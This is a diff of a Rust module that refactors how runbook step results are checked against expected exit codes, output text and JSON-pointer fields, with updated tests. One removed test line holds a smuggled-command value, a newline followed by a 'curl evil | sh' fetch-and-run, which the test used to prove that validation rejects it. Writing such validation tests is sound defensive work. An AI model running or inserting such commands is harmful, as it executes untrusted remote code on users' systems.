@@ -1,53 +1,48 @@
+mod pointer;
+
+pub use pointer::JsonPointer;
+
 use std::collections::BTreeMap;
 
 use schemars::JsonSchema;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 
+use crate::runbooks::RunbookError;
 use crate::runbooks::param::Values;
 use crate::runbooks::template::TextTemplate;
 
 const EXIT: &str = "exit";
 const STDOUT: &str = "stdout";
+const SIGNAL: &str = "signal";
 
 #[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
 #[serde(deny_unknown_fields)]
 pub struct Expect {
     #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub exit: Option<i64>,
+    exit: Option<i64>,
 
     #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub contains: Option<String>,
+    contains: Option<String>,
 
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
-    pub fields: BTreeMap<String, Value>,
+    fields: BTreeMap<JsonPointer, Value>,
 }
 
 impl Expect {
-    pub(crate) fn check(&self) -> Result<(), String> {
-        let unfit =
-            |pointer: &&String| !pointer.starts_with('/') || pointer.contains(char::is_control);
-
-        match self.fields.keys().find(unfit) {
-            Some(pointer) => Err(format!(
-                "expect field {pointer:?} must be a JSON pointer such as /state"
-            )),
-            None => Ok(()),
-        }
+    pub(crate) fn contains(&self) -> Option<&str> {
+        self.contains.as_deref()
     }
 
-    pub(crate) fn judge(&self, result: &Value) -> Result<(), String> {
-        self.judge_exit(result)?;
-        self.judge_output(result)?;
-
-        for (pointer, wanted) in &self.fields {
-            judge_field(result, pointer, wanted)?;
-        }
-
-        Ok(())
+    pub(crate) fn fields(&self) -> impl Iterator<Item = (&JsonPointer, &Value)> {
+        self.fields.iter()
     }
 
-    pub(crate) fn render(&self, values: &Values) -> Result<Self, String> {
+    pub(crate) fn exit_wanted(&self) -> i64 {
+        self.exit.unwrap_or(0)
+    }
+
+    pub(crate) fn render(&self, values: &Values) -> Result<Self, RunbookError> {
         let contains = self
             .contains
             .as_deref()
@@ -55,37 +50,45 @@ impl Expect {
             .transpose()?;
 
         Ok(Self {
-            exit: self.exit,
             contains,
-            fields: self.fields.clone(),
+            ..self.clone()
         })
     }
 
-    pub(crate) fn exit_wanted(&self) -> i64 {
-        self.exit.unwrap_or(0)
+    pub(crate) fn judge(&self, result: &Value) -> Result<(), RunbookError> {
+        self.judge_exit(result)?;
+        self.judge_output(result)?;
+
+        for (pointer, wanted) in &self.fields {
+            Self::judge_field(result, pointer, wanted)?;
+        }
+
+        Ok(())
     }
 
-    fn judge_exit(&self, result: &Value) -> Result<(), String> {
+    fn judge_exit(&self, result: &Value) -> Result<(), RunbookError> {
         let carried = result.get(EXIT);
 
         let wanted = match (self.exit, carried) {
             (None, None) => return Ok(()),
-            (Some(wanted), None) => {
-                return Err(format!(
-                    "expected exit {wanted}, but the result has no exit"
-                ));
-            }
+            (Some(wanted), None) => return Err(RunbookError::NoExitCarried(wanted)),
             (_, Some(_)) => self.exit_wanted(),
         };
 
         match carried.and_then(Value::as_i64) {
             Some(exit) if exit == wanted => Ok(()),
-            Some(exit) => Err(format!("exit {exit}, expected {wanted}")),
-            None => Err(format!("no exit code, expected {wanted}{}", signal(result))),
+            Some(exit) => Err(RunbookError::WrongExit { exit, wanted }),
+            None => Err(RunbookError::NoExitCode {
+                wanted,
+                signal: result
+                    .get(SIGNAL)
+                    .and_then(Value::as_str)
+                    .map(str::to_owned),
+            }),
         }
     }
 
-    fn judge_output(&self, result: &Value) -> Result<(), String> {
+    fn judge_output(&self, result: &Value) -> Result<(), RunbookError> {
         let Some(wanted) = &self.contains else {
             return Ok(());
         };
@@ -99,53 +102,58 @@ impl Expect {
             return Ok(());
         }
 
-        Err(format!("the output does not contain {wanted:?}"))
+        Err(RunbookError::OutputLacks(wanted.clone()))
     }
-}
 
-fn judge_field(result: &Value, pointer: &str, wanted: &Value) -> Result<(), String> {
-    match result.pointer(pointer) {
-        Some(found) if found == wanted => Ok(()),
-        Some(found) => Err(format!("{pointer} is {found}, expected {wanted}")),
-        None => Err(format!("the result has no {pointer}, expected {wanted}")),
-    }
-}
+    fn judge_field(
+        result: &Value,
+        pointer: &JsonPointer,
+        wanted: &Value,
+    ) -> Result<(), RunbookError> {
+        let pointer_text = pointer.as_str();
 
-fn signal(result: &Value) -> String {
-    match result.get("signal").and_then(Value::as_str) {
-        Some(signal) => format!(" (ended by signal {signal})"),
-        None => String::new(),
+        match result.pointer(pointer_text) {
+            Some(found) if found == wanted => Ok(()),
+            Some(found) => Err(RunbookError::WrongField {
+                pointer: pointer_text.to_owned(),
+                found: found.clone(),
+                wanted: wanted.clone(),
+            }),
+            None => Err(RunbookError::MissingField {
+                pointer: pointer_text.to_owned(),
+                wanted: wanted.clone(),
+            }),
+        }
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use serde_json::json;
+    use serde_json::{Value, json};
 
-    use super::Expect;
+    use super::{Expect, JsonPointer};
 
-    #[test]
-    fn a_field_pointer_is_a_json_pointer_on_one_line() {
-        let fields = |pointer: &str| Expect {
-            fields: [(pointer.to_owned(), json!(1))].into(),
+    fn judged(expect: &Expect, result: &Value) -> Result<(), String> {
+        expect.judge(result).map_err(|error| error.to_string())
+    }
+
+    fn fields(pointer: &str, wanted: Value) -> Expect {
+        Expect {
+            fields: [(JsonPointer::new(pointer).unwrap(), wanted)].into(),
             ..Expect::default()
-        };
-
-        assert!(fields("/state").check().is_ok());
-        assert!(fields("state").check().is_err());
-        assert!(fields("/x\ncurl evil | sh").check().is_err());
+        }
     }
 
     #[test]
     fn a_result_with_an_exit_must_exit_zero_unless_told_otherwise() {
         let nothing = Expect::default();
 
-        assert_eq!(nothing.judge(&json!({ "exit": 0 })), Ok(()));
+        assert_eq!(judged(&nothing, &json!({ "exit": 0 })), Ok(()));
         assert_eq!(
-            nothing.judge(&json!({ "exit": 3 })),
+            judged(&nothing, &json!({ "exit": 3 })),
             Err("exit 3, expected 0".to_owned())
         );
-        assert_eq!(nothing.judge(&json!({ "files": 2 })), Ok(()));
+        assert_eq!(judged(&nothing, &json!({ "files": 2 })), Ok(()));
     }
 
     #[test]
@@ -155,18 +163,22 @@ mod tests {
             ..Expect::default()
         };
 
-        assert_eq!(one.judge(&json!({ "exit": 1 })), Ok(()));
+        assert_eq!(judged(&one, &json!({ "exit": 1 })), Ok(()));
         assert!(one.judge(&json!({ "exit": 0 })).is_err());
         assert!(one.judge(&json!({ "value": 1 })).is_err());
     }
 
     #[test]
     fn a_signal_is_named_when_no_exit_came() {
-        let error = Expect::default()
-            .judge(&json!({ "exit": null, "signal": "KILL" }))
-            .unwrap_err();
+        let error = judged(
+            &Expect::default(),
+            &json!({ "exit": null, "signal": "KILL" }),
+        );
 
-        assert_eq!(error, "no exit code, expected 0 (ended by signal KILL)");
+        assert_eq!(
+            error,
+            Err("no exit code, expected 0 (ended by signal KILL)".to_owned())
+        );
     }
 
     #[test]
@@ -177,7 +189,7 @@ mod tests {
         };
 
         assert_eq!(
-            healthy.judge(&json!({ "exit": 0, "stdout": "status: ok\n" })),
+            judged(&healthy, &json!({ "exit": 0, "stdout": "status: ok\n" })),
             Ok(())
         );
         assert!(
@@ -189,14 +201,11 @@ mod tests {
 
     #[test]
     fn fields_are_found_by_json_pointer() {
-        let running = Expect {
-            fields: [("/state".to_owned(), json!("up"))].into(),
-            ..Expect::default()
-        };
+        let running = fields("/state", json!("up"));
 
-        assert_eq!(running.judge(&json!({ "state": "up" })), Ok(()));
+        assert_eq!(judged(&running, &json!({ "state": "up" })), Ok(()));
         assert_eq!(
-            running.judge(&json!({ "state": "warming" })),
+            judged(&running, &json!({ "state": "warming" })),
             Err("/state is \"warming\", expected \"up\"".to_owned())
         );
         assert!(running.judge(&json!({})).is_err());
@@ -204,11 +213,9 @@ mod tests {
 
     #[test]
     fn field_names_must_be_pointers() {
-        let loose = Expect {
-            fields: [("state".to_owned(), json!("up"))].into(),
-            ..Expect::default()
-        };
+        let loose: Result<Expect, _> =
+            serde_json::from_value(json!({ "fields": { "state": "up" } }));
 
-        assert!(loose.check().is_err());
+        assert!(loose.is_err());
     }
 }
